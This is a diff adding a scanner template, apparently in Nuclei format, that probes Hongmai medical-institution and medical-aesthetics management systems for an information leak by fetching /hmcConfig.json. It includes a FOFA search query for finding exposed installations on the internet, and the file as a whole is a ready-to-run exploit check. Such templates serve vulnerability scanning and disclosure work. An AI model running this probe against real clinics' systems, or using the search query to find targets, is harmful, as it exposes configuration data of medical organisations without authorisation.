@@ -1,0 +1,37 @@
+id: poc-fg47rk2rk3kf9cl0
+info:
+  name: 宏脉信息技术hmcConfig存在信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fg47rk2rk3kf9cl0'
+  tags: info-leak,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: fg47rk2rk3kf9cl0
+    fofa: title="宏脉医美行业管理系统" || body="宏脉医疗机构管理系统"
+http:
+- raw:
+  - 'GET /hmcConfig.json HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: close
+
+    Upgrade-Insecure-Requests: 1
+
+    Pragma: no-cache
+
+    Cache-Control: no-cache'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
